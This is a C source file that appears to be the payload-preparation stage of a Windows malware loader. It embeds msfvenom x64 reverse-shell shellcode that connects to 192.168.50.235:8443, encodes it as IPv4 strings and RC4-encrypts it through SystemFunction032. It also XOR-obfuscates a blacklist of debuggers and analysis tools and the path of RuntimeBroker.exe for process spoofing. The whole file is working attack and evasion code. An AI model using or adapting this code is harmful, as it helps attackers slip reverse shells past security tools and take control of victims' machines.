#include <Windows.h>
#include <stdio.h>

// Disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

#define BLACKLISTARRAY_SIZE 17 // Number of elements inside the array
WCHAR* g_BlackListedDebuggers[BLACKLISTARRAY_SIZE] = {
			L"x64dbg.exe",                 // xdbg debugger	
			L"x32dbg.exe",                 // xdbg debugger	
			L"ida.exe",                    // IDA disassembler
			L"ida64.exe",                  // IDA disassembler
			L"VsDebugConsole.exe",         // Visual Studio debugger	
			L"msvsmon.exe",                 // Visual Studio debugger
			L"ollydbg.exe",				   // Ollydbg Debugger
			L"windbg.exe",				   // Windbg Debugger
			L"ImmunityDebugger.exe",	   // Immunity Debugger
			L"binaryninja.exe",			   // Binary Ninja
			L"procmon.exe",				   // Process Monitor
			L"wireshark.exe",			   // WireShark
			L"inetsim.exe",				   // InetSim
			L"Fiddler.exe",				   // Fiddler
			L"burpsuite.exe",			   // BurpSuite
			L"ProcessHacker.exe",		   // ProcessHacker
			L"regshot.exe"				   // RegShot
};

// x64 calc metasploit shellcode (to encrypt)
// Payload must be divisible by 4 for IPv4 Obfuscation. If not, just put 0x00 bytes at the end

//unsigned char rawData[] = {
//	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
//	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
//	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
//	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
//	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
//	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
//	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
//	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
//	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
//	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
//	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
//	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
//	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
//	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
//	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
//	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
//	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
//	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
//	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
//	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
//	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
//	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
//	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
//};

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.235 LPORT=8443 -f c
unsigned char rawData[] = {
	0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50
	,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52
	,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a
	,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41
	,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52
	,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48
	,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40
	,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48
	,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41
	,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1
	,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c
	,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01
	,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a
	,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b
	,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33
	,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00
	,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x20,0xfb,0xc0,0xa8,0x32,0xeb
	,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07
	,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29
	,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48
	,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea
	,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89
	,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81
	,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,0x64,0x00,0x00,0x00,0x00
	,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0
	,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01
	,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41
	,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d
	,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48
	,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff
	,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5
	,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb
	,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};

// this is what SystemFunction032 function take as a parameter
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;


// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
	);

VOID XorStringObfuscate(IN LPCWSTR String);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS	STATUS = NULL;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we use LoadLibraryA to load Advapi32.dll into the prcess, 
	// and using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value 
	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

char* GenerateIpv4(int a, int b, int c, int d) {

	unsigned char Output[16];
	// Creating the IPv4 address and saving it to the 'Output' variable 
	sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

	return (char*)Output;
}

// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
char** GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize, OUT int *pIPv4Size) {

	// If the shellcode buffer is null or the size is not a multiple of 4, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0) {
		return FALSE;
	}

	// Calculate the number of IPv4 addresses
	int numAddresses = ShellcodeSize / 4;
	printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));

	// Allocate memory for the buffer
	// create an unsigned char array of unsigned chars that each have 16 bytes
	char (*Ipv4Array)[16] = malloc(numAddresses * sizeof(char[16]));
	char* IP = NULL;

	/* ---------- Create array of pointers ---------
	char** Ipv4Array = malloc(numAddresses * sizeof(char*));
	for (int i = 0; i < numAddresses; i++) {
		Ipv4Array[i] = malloc(16 * sizeof(char));
	}
	*/

	// Loop through the shellcode and generate the IPv4 addresses
	for (int i = 0; i < ShellcodeSize; i += 4) {

		// Generating the IPv4 address from 4 bytes which begin at i until [i + 3]
		// Copy the generated IPv4 address into the allocated memory

		(char*) IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);
		memcpy(Ipv4Array[i / 4], IP, 16);

		// ------- Use if Ipv4Array is an array of pointers -------
		// strcpy(Ipv4Array[(i / 4)], IP);
	}
	
	// Loop through the IPv4 addresses and print them
	for (int i = 0; i < numAddresses; i++) {
		printf("\"%s\"", Ipv4Array[i]);

		// Print a comma and newline unless it's the last address
		if (i < numAddresses - 1) {
			printf(",\n\t");
		}
	}

	printf("\n};\n\n");
	int size = NULL;
	size = sizeof(Ipv4Array[0]) * numAddresses;
	*pIPv4Size = size;
	return (char**)Ipv4Array;
}

// print data as hex arrays - C style
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n");

}

// the plaintext key - generated by keguard
unsigned char OriginalKey[] = {
		0xAC, 0xC1, 0x35, 0xF3, 0xDB, 0x6C, 0xCE, 0x95, 0xE5, 0xBA, 0xE1, 0xAC, 0xFC, 0xA6, 0xC9, 0x2C };

int main() {

	unsigned char** IPv4Payload = NULL;
	int IPv4Size = NULL;
	// Obfuscate Payload with Ipv4
	(unsigned char**)IPv4Payload = GenerateIpv4Output(rawData, sizeof(rawData), &IPv4Size);
	if (!IPv4Payload == NULL) {

		// Calculate IPv4'ed payload size
		
		// Encrypt IPv4'ed payload
		if (!Rc4EncryptionViSystemFunc032(OriginalKey, (unsigned char**)IPv4Payload, sizeof(OriginalKey), IPv4Size)) {
			return -1;
		}
	}
	else {
		return -1;
	}

	PrintHexData("Rc4Encrypted_IPv4Payload", IPv4Payload, IPv4Size);
	free(IPv4Payload);
	for (int i = 0; i < BLACKLISTARRAY_SIZE; i++) {
		XorStringObfuscate(g_BlackListedDebuggers[i]);
	}
	#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
	#define PROCESS_PARMS		L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
	#define PROCESS_PATH		L"C:\\Windows\\System32"
	XorStringObfuscate(TARGET_PROCESS);
	XorStringObfuscate(PROCESS_PARMS);
	XorStringObfuscate(PROCESS_PATH);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
